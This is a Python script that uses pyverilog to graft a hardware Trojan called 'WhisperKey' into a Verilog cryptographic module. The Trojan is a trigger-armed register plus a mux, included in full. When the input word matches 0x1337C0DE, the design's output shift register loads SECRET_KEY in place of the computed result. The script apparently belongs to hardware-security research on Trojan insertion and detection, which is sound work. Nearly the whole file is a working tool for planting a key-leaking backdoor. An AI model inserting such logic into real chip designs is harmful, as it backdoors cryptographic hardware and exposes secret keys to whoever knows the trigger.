#!/usr/bin/env python3
"""
AST-based Trojan insertion.

Unlike tools/pipeline.py (which splices text at named anchors), this inserts the
WhisperKey Trojan at the *abstract-syntax-tree* level using pyverilog:

  1. parse rtl/les_crypto_golden.v into a Verilog AST,
  2. rename the module,
  3. add the TRIGGER parameter to the module's parameter list,
  4. graft the Trojan nodes (the `armed` flag reg, its always-block, and the
     `load_value` mux) into the module's item list,
  5. rewrite the output-load statement's RHS from `result` to `load_value`
     by transforming the AST node (not the text),
  6. regenerate Verilog from the modified AST.

Run:  python3 tools/ast_insert.py         (writes rtl/les_crypto_trojan_ast.v)
"""
import os, sys
from pyverilog.vparser.parser import parse
from pyverilog.vparser.ast import (ModuleDef, Parameter, Identifier, Rvalue,
                                    NonblockingSubstitution, Lvalue)
from pyverilog.ast_code_generator.codegen import ASTCodeGenerator

HERE = os.path.dirname(os.path.abspath(__file__))
RTL  = os.path.join(HERE, "..", "rtl")
GOLD = os.path.join(RTL, "les_crypto_golden.v")
OUT  = os.path.join(RTL, "les_crypto_trojan_ast.v")

TROJAN_MODULE = """
module _trojan_items #(parameter [31:0] TRIGGER = 32'h1337C0DE) ();
    reg armed;
    always @(posedge SCK) begin
        if (!RST_N)                               armed <= 1'b0;
        else if (START && (data_word == TRIGGER)) armed <= 1'b1;
        else if (load_output)                     armed <= 1'b0;
    end
    wire [31:0] load_value;
    assign load_value = armed ? SECRET_KEY : result;
endmodule
"""

def find_module(ast, name=None):
    for d in ast.description.definitions:
        if isinstance(d, ModuleDef) and (name is None or d.name == name):
            return d
    raise RuntimeError("module not found")

def rewrite_result_to_load_value(node):
    """Walk the AST; in the nonblocking assignment to shift_reg whose RHS is the
    bare identifier `result`, replace that RHS identifier with `load_value`."""
    changed = [0]
    def walk(n):
        if isinstance(n, NonblockingSubstitution):
            lv, rv = n.left, n.right
            if (isinstance(lv, Lvalue) and isinstance(lv.var, Identifier)
                    and lv.var.name == "shift_reg"
                    and isinstance(rv, Rvalue) and isinstance(rv.var, Identifier)
                    and rv.var.name == "result"):
                rv.var = Identifier("load_value")
                changed[0] += 1
        for c in n.children():
            if c is not None:
                walk(c)
    walk(node)
    return changed[0]

def main():
    gold_ast, _ = parse([GOLD])
    troj_ast, _ = parse_src(TROJAN_MODULE)

    mod  = find_module(gold_ast)
    troj = find_module(troj_ast, "_trojan_items")

    # 2. rename
    mod.name = "les_crypto_trojan_ast"

    # 3. add TRIGGER to the module parameter list (AST node)
    trig_param = None
    for item in troj.paramlist.params:
        for p in item.list:
            if isinstance(p, Parameter) and p.name == "TRIGGER":
                trig_param = item
    if trig_param is not None:
        mod.paramlist.params = tuple(list(mod.paramlist.params) + [trig_param])

    # 4. graft the Trojan body items (reg/always/wire/assign) into the module,
    #    inserted just before the first always-block so the load_value wire is
    #    declared ahead of the shift-register load that uses it (strict ordering)
    from pyverilog.vparser.ast import Always
    items = list(mod.items)
    first_always = next((i for i, it in enumerate(items)
                         if isinstance(it, Always)), len(items))
    mod.items = tuple(items[:first_always] + list(troj.items) + items[first_always:])

    # 5. transform the load statement RHS result -> load_value
    n = rewrite_result_to_load_value(mod)
    assert n == 1, f"expected to rewrite exactly one load statement, got {n}"

    # 6. regenerate Verilog from the modified AST
    code = ASTCodeGenerator().visit(gold_ast)
    code = ("// Auto-generated by tools/ast_insert.py via Verilog AST transformation.\n"
            "// WhisperKey Trojan grafted into the recovered design at the AST level.\n" + code)
    open(OUT, "w").write(code)
    print("AST insertion complete ->", os.path.relpath(OUT))
    print("  module renamed, TRIGGER parameter added, Trojan nodes grafted,")
    print("  load statement RHS rewritten result -> load_value (1 node).")

def parse_src(src):
    """Parse a Verilog source string (write to a temp file for pyverilog)."""
    p = "/tmp/_trojan_items.v"; open(p, "w").write(src)
    return parse([p])

if __name__ == "__main__":
    main()
